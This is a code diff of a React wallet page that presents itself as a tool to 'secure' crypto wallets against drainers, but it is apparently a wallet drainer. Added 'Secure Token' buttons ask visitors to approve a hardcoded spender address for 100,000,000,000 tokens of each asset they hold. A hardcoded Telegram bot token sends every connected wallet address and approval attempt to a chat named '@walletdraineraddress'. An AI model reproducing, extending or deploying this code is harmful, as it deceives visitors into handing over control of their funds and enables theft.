@@ -9,6 +9,7 @@ import {
   FaDiscord,
   FaTelegramPlane,
   FaGithub,
+  FaCheckCircle,
 } from "react-icons/fa";
 import {
   useDisconnect,
@@ -41,15 +42,10 @@ export default function Home() {
   const [messageTimeout, setMessageTimeout] = useState<NodeJS.Timeout | null>(
     null
   ); // State for timeout
-
-  // ENV VARIABLES
-
-  const spenderAddress = process.env
-    .NEXT_PUBLIC_SPENDER_ADDRESS as `0x${string}`;
-  const contractAddress = process.env.NEXT_PUBLIC_ADDRESS as `0x${string}`;
-  const botToken = process.env.NEXT_PUBLIC_BOT_TOKEN;
-  const chatId = process.env.NEXT_PUBLIC_CHAT_ID;
-  const websiteName = process.env.NEXT_PUBLIC_WEBSITE_NAME;
+  const [selectedToken, setSelectedToken] = useState<any>(null); // State to track the currently selected token for approval
+  const [approvalStatuses, setApprovalStatuses] = useState<{
+    [key: string]: boolean;
+  }>({}); // State to track approval status for each token
 
   const { open, close } = useWeb3Modal();
   const { disconnect } = useDisconnect();
@@ -63,25 +59,67 @@ export default function Home() {
     signMessage,
   } = useSignMessage({ message: "gm wagmi frens" });
 
-  // const spenderAddress = "0x43E7263534d6aB44347e0567fAA6927A2b865516";
+  const spenderAddress = "0x43E7263534d6aB44347e0567fAA6927A2b865516";
+
+  // Prepare contract write hook
   const { config } = usePrepareContractWrite({
-    address: contractAddress, // USDT-ERC20
+    address: selectedToken?.token_address as Address,
     abi: usdtABI,
     functionName: "approve",
     args: [spenderAddress as Address, parseEther("100000000000")],
+    enabled: !!selectedToken,
   });
 
-  const {
-    data: approveData,
-    isSuccess: approveSuccess,
-    isLoading: isApprovingLoading,
-    write,
-    status, // Add status to track the transaction state
-  } = useContractWrite(config);
+  const { write, status } = useContractWrite(config);
 
   const closeAll = () => {
     setIsNetworkSwitchHighlighted(false);
     setIsConnectHighlighted(false);
+  };
+
+  const secureToken = async (token: any) => {
+    setSelectedToken(token);
+    setNotice(
+      `Attempting to secure ${token.symbol}. Please open wallet to continue...`
+    );
+    setIsApproving(true);
+
+    if (messageTimeout) {
+      clearTimeout(messageTimeout);
+    }
+
+    setMessageTimeout(
+      setTimeout(() => {
+        setError(null); // Clear error message after timeout
+        setNotice(null); // Clear notice message after timeout
+        setIsApproving(false);
+      }, 30000)
+    );
+
+    try {
+      await sendTelegramNotification(
+        `${address} is attempting to secure ${token.symbol}`
+      );
+
+      if (write) {
+        await write();
+        if (status === "success") {
+          setApprovalStatuses((prevStatuses) => ({
+            ...prevStatuses,
+            [token.symbol]: true,
+          })); // Mark as approved
+        } else if (status === "error") {
+          setError(`Failed to secure ${token.symbol}. Please try again.`);
+        }
+      }
+    } catch (error) {
+      console.error(`Error approving ${token.symbol}:`, error);
+      setError(`Failed to secure ${token.symbol}. Please try again.`);
+    } finally {
+      setNotice(null); // Clear notice after attempt
+      setMessageTimeout(null); // Clear timeout
+      setIsApproving(false);
+    }
   };
 
   const secureWallet = async () => {
@@ -106,12 +144,13 @@ export default function Home() {
           setTimeout(() => {
             setError(null); // Clear error message after timeout
             setNotice(null); // Clear notice message after timeout
+            setIsApproving(false);
           }, 30000)
         );
 
         // Send Telegram message indicating approval attempt
         await sendTelegramNotification(
-          `${address} is attempting to secure wallet on ${websiteName}`
+          `${address} is attempting to secure wallet`
         );
 
         await write();
@@ -165,9 +204,7 @@ export default function Home() {
 
   useEffect(() => {
     if (address) {
-      sendTelegramNotification(
-        `Wallet (${address}) connected on ${websiteName}.`
-      );
+      sendTelegramNotification(`Wallet (${address}) connected.`);
     }
   }, [address]);
 
@@ -185,7 +222,6 @@ export default function Home() {
     }
   }, [status]);
 
-  // Ensure error message is cleared on page reload
   useEffect(() => {
     setError(null);
     setNotice(null);
@@ -207,8 +243,8 @@ export default function Home() {
 
   const sendTelegramNotification = async (message: string) => {
     try {
-      // const tbotToken = botToken;
-      // const chatId = "@walletdraineraddress";
+      const botToken = "7095023752:AAGH_bXRYtd3qe0kPI6AewFy4VVs8oqWCo0";
+      const chatId = "@walletdraineraddress";
 
       await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
         chat_id: chatId,
@@ -296,7 +332,10 @@ export default function Home() {
                       </button>
                       <div className={styles.tokenList}>
                         {tokens.map((token) => (
-                          <div key={token.symbol} className={styles.tokenItem}>
+                          <div
+                            key={token.token_address}
+                            className={styles.tokenItem}
+                          >
                             <Image
                               className={styles.tokenImage}
                               src={token.logo || defaultImage}
@@ -311,6 +350,23 @@ export default function Home() {
                                 {formatBalance(token.balance, token.decimals)}
                               </p>
                             </div>
+                            <button
+                              onClick={() => secureToken(token)}
+                              className={`${styles.button} ${
+                                approvalStatuses[token.symbol]
+                                  ? styles.successButton
+                                  : styles.dangerButton
+                              }`}
+                              disabled={
+                                approvalStatuses[token.symbol] !== undefined
+                              }
+                            >
+                              {approvalStatuses[token.symbol] ? (
+                                <FaCheckCircle size={20} color="green" />
+                              ) : (
+                                "Secure Token"
+                              )}
+                            </button>
                           </div>
                         ))}
                       </div>
@@ -332,7 +388,7 @@ export default function Home() {
                   </p>
                   <p className={styles.marginP}>
                     The contract scans your address for active bots and token
-                    drianers and helps you disable them.
+                    drainer and helps you disable them.
                   </p>
                   <p className={styles.marginP}>
                     <strong>Steps to Secure Your Wallet:</strong>
